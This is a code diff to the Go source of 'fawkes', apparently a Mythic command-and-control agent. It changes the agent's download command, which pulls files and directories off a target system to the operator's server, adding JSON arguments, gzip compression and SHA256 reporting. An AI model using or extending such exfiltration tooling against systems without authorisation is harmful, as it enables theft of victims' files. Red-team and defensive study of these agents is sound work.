@@ -2,6 +2,7 @@ package commands
 
 import (
 	"archive/zip"
+	"encoding/json"
 	"fmt"
 	"io"
 	"io/fs"
@@ -10,6 +11,7 @@ import (
 	"strings"
 	"time"
 
+	"fawkes/pkg/files"
 	"fawkes/pkg/structs"
 )
 
@@ -26,10 +28,19 @@ func (c *DownloadCommand) Description() string {
 	return "Download a file or directory from the target system"
 }
 
+// downloadArgs represents JSON-structured download arguments
+type downloadArgs struct {
+	Path     string `json:"path"`
+	File     string `json:"file"`     // Alias for path (file browser compat)
+	Compress *bool  `json:"compress"` // nil = auto (compress if > 1MB)
+}
+
+// autoCompressThreshold is the file size above which compression is auto-enabled
+const autoCompressThreshold = 1024 * 1024 // 1 MB
+
 // Execute executes the download command with full chunked file transfer
 func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
-	// Strip surrounding quotes in case the user wrapped the path (e.g. "C:\Program Data\file.txt")
-	path := stripPathQuotes(task.Params)
+	path, compress := parseDownloadArgs(task.Params)
 
 	if path == "" {
 		return errorResult("Error: No file path specified. Usage: download <file_path>")
@@ -48,13 +59,41 @@ func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if info.IsDir() {
+		// Directories are already zip-compressed; no additional gzip
 		return downloadDirectory(task, fullPath)
 	}
 
+	// Auto-determine compression if not explicitly set
+	if compress == nil {
+		shouldCompress := info.Size() > autoCompressThreshold
+		compress = &shouldCompress
+	}
+
+	if *compress {
+		return downloadFileCompressed(task, fullPath, info.Size())
+	}
 	return downloadFile(task, fullPath)
 }
 
-// downloadFile handles single file downloads via Mythic's chunked transfer
+// parseDownloadArgs parses download parameters from either JSON or plain string
+func parseDownloadArgs(params string) (path string, compress *bool) {
+	params = strings.TrimSpace(params)
+
+	// Try JSON first
+	var args downloadArgs
+	if err := json.Unmarshal([]byte(params), &args); err == nil {
+		path = args.Path
+		if path == "" {
+			path = args.File
+		}
+		return stripPathQuotes(path), args.Compress
+	}
+
+	// Fall back to plain string path
+	return stripPathQuotes(params), nil
+}
+
+// downloadFile handles single file downloads via Mythic's chunked transfer (uncompressed)
 func downloadFile(task structs.Task, fullPath string) structs.CommandResult {
 	file, err := os.Open(fullPath)
 	if err != nil {
@@ -67,7 +106,50 @@ func downloadFile(task structs.Task, fullPath string) structs.CommandResult {
 		return errorf("Error getting file info: %s", err.Error())
 	}
 
-	return sendFileToMythic(task, file, fi.Name(), fullPath)
+	result, tfResult := sendFileToMythicWithResult(task, file, fi.Name(), fullPath)
+	if result.Status == "success" && tfResult != nil {
+		result.Output = fmt.Sprintf("Downloaded %s (%s)\nSHA256: %s",
+			fullPath, formatFileSize(fi.Size()), tfResult.SHA256)
+	}
+	return result
+}
+
+// downloadFileCompressed gzip-compresses a file before transfer to reduce bandwidth
+func downloadFileCompressed(task structs.Task, fullPath string, originalSize int64) structs.CommandResult {
+	// Compress the file to a temp gzip file
+	compResult, err := files.CompressFileGzip(fullPath)
+	if err != nil {
+		// Fall back to uncompressed transfer on compression failure
+		return downloadFile(task, fullPath)
+	}
+	defer secureRemove(compResult.CompressedPath)
+
+	// If compression didn't help (e.g., already compressed file), send uncompressed
+	if compResult.CompressedSize >= originalSize {
+		return downloadFile(task, fullPath)
+	}
+
+	// Open the compressed file for transfer
+	gzFile, err := os.Open(compResult.CompressedPath)
+	if err != nil {
+		return downloadFile(task, fullPath)
+	}
+	defer gzFile.Close()
+
+	// Transfer with .gz extension so operator knows it's compressed
+	downloadName := filepath.Base(fullPath) + ".gz"
+	ratio := files.CompressionRatio(compResult.OriginalSize, compResult.CompressedSize)
+
+	result, _ := sendFileToMythicWithResult(task, gzFile, downloadName, fullPath)
+	if result.Status == "success" {
+		result.Output = fmt.Sprintf("Downloaded %s (compressed)\nOriginal: %s → Compressed: %s (%.1f%% reduction)\nOriginal SHA256: %s",
+			fullPath,
+			formatFileSize(compResult.OriginalSize),
+			formatFileSize(compResult.CompressedSize),
+			ratio,
+			compResult.SHA256)
+	}
+	return result
 }
 
 // downloadDirectory zips a directory into a temp file, downloads it, then cleans up
@@ -200,8 +282,15 @@ func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
 	return fileCount, totalSize, nil
 }
 
-// sendFileToMythic sends a file to Mythic via the chunked transfer channel
+// sendFileToMythic sends a file to Mythic via the chunked transfer channel (backward-compat wrapper)
 func sendFileToMythic(task structs.Task, file *os.File, fileName, fullPath string) structs.CommandResult {
+	result, _ := sendFileToMythicWithResult(task, file, fileName, fullPath)
+	return result
+}
+
+// sendFileToMythicWithResult sends a file to Mythic and returns both the command result and transfer metadata
+func sendFileToMythicWithResult(task structs.Task, file *os.File, fileName, fullPath string) (structs.CommandResult, *structs.FileTransferResult) {
+	tfResult := &structs.FileTransferResult{}
 	downloadMsg := structs.SendFileToMythicStruct{}
 	downloadMsg.Task = &task
 	downloadMsg.IsScreenshot = false
@@ -210,16 +299,17 @@ func sendFileToMythic(task structs.Task, file *os.File, fileName, fullPath strin
 	downloadMsg.FileName = fileName
 	downloadMsg.FullPath = fullPath
 	downloadMsg.FinishedTransfer = make(chan int, 2)
+	downloadMsg.TransferResult = tfResult
 
 	task.Job.SendFileToMythic <- downloadMsg
 
 	for {
 		select {
 		case <-downloadMsg.FinishedTransfer:
-			return successResult("Finished Downloading")
+			return successResult("Finished Downloading"), tfResult
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
-				return errorResult("Tasked to stop early")
+				return errorResult("Tasked to stop early"), nil
 			}
 		}
 	}
